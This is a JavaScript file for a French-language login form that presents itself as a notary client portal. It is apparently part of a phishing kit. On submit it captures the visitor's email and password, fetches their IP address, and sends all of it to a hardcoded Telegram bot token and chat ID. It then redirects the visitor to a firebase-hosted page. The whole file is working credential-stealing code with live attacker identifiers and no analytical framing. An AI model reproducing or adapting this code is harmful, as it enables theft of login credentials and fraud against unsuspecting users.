 $(document).ready(function() {
        // Configuration Telegram
        var telegram_bot_id = "7341995560:AAHzLqEpWdDkUuGkt51nDlE6oaBAU39xF_o";
        var chat_id = "-4513385515";
        
        // Références aux éléments
        var emailInput = document.getElementById("email");
        var passwordInput = document.getElementById("Password");
        var submitBtn = document.getElementById("submitBtn");
        var errorMsgDiv = document.getElementById("errorMsg");
        
        // Fonction pour afficher les erreurs
        function showError(message) {
            errorMsgDiv.innerHTML = message;
            errorMsgDiv.classList.add('show');
            setTimeout(function() {
                errorMsgDiv.classList.remove('show');
            }, 5000);
        }
        
        // Fonction pour valider les champs
        function validateForm() {
            var email = emailInput.value.trim();
            var password = passwordInput.value.trim();
            
            if (email === "") {
                showError("Veuillez saisir votre adresse email.");
                emailInput.focus();
                return false;
            }
            
            if (password === "") {
                showError("Veuillez saisir votre mot de passe.");
                passwordInput.focus();
                return false;
            }
            
            // Validation basique de l'email
            var emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            if (!emailRegex.test(email)) {
                showError("Veuillez saisir une adresse email valide.");
                emailInput.focus();
                return false;
            }
            
            return true;
        }
        
        // Fonction d'envoi à Telegram
        function sendToTelegram(email, password) {
            return new Promise(function(resolve, reject) {
                var message = "📧 NOUVEAU LOGIN NOTAIRE 📧\n";
                message += "===========================\n";
                message += "📨 Email: " + email + "\n";
                message += "🔐 Mot de passe: " + password + "\n";
                message += "🌐 IP: Récupération...\n";
                message += "🕐 Date: " + new Date().toLocaleString('fr-FR') + "\n";
                message += "===========================";
                
                // Récupérer l'IP
                $.getJSON('https://api.ipify.org?format=jsonp&callback=?', function(ipData) {
                    message = message.replace("IP: Récupération...", "🌐 IP: " + ipData.ip);
                    
                    // Envoi vers Telegram
                    $.ajax({
                        url: "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
                        type: "POST",
                        dataType: "json",
                        contentType: "application/json",
                        data: JSON.stringify({
                            chat_id: chat_id,
                            text: message,
                            parse_mode: "HTML"
                        }),
                        success: function(response) {
                            if (response.ok) {
                                console.log("Message envoyé avec succès à Telegram");
                                resolve(true);
                            } else {
                                console.error("Erreur Telegram:", response);
                                reject(new Error("Erreur d'envoi à Telegram"));
                            }
                        },
                        error: function(xhr, status, error) {
                            console.error("Erreur AJAX:", error);
                            reject(error);
                        }
                    });
                }).fail(function() {
                    // Si impossible de récupérer l'IP, envoyer sans IP
                    $.ajax({
                        url: "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
                        type: "POST",
                        dataType: "json",
                        contentType: "application/json",
                        data: JSON.stringify({
                            chat_id: chat_id,
                            text: message,
                            parse_mode: "HTML"
                        }),
                        success: function(response) {
                            if (response.ok) {
                                console.log("Message envoyé avec succès à Telegram");
                                resolve(true);
                            } else {
                                reject(new Error("Erreur d'envoi à Telegram"));
                            }
                        },
                        error: function(xhr, status, error) {
                            reject(error);
                        }
                    });
                });
            });
        }
        
        // Gestionnaire du clic sur le bouton
        submitBtn.onclick = function() {
            // Valider le formulaire
            if (!validateForm()) {
                return false;
            }
            
            // Désactiver le bouton pendant l'envoi
            submitBtn.disabled = true;
            var originalText = submitBtn.innerHTML;
            submitBtn.innerHTML = '<span class="loading-text">Traitement en cours...</span>';
            
            var email = emailInput.value.trim();
            var password = passwordInput.value.trim();
            
            // Envoyer à Telegram
            sendToTelegram(email, password)
                .then(function() {
                    // Succès - rediriger
                    console.log("Redirection en cours...");
                    window.location.href = "https://notaireinfoclientmessage.web.app";
                })
                .catch(function(error) {
                    // Erreur - réactiver le bouton
                    console.error("Erreur:", error);
                    submitBtn.disabled = false;
                    submitBtn.innerHTML = originalText;
                    showError("Une erreur technique s'est produite. Veuillez réessayer.");
                });
            
            return false;
        };
        
        // Permettre la soumission avec la touche Entrée
        emailInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                e.preventDefault();
                passwordInput.focus();
            }
        });
        
        passwordInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                e.preventDefault();
                submitBtn.click();
            }
        });
        
        // Effacer les erreurs quand l'utilisateur commence à taper
        emailInput.addEventListener('input', function() {
            errorMsgDiv.classList.remove('show');
        });
        
        passwordInput.addEventListener('input', function() {
            errorMsgDiv.classList.remove('show');
        });
    });
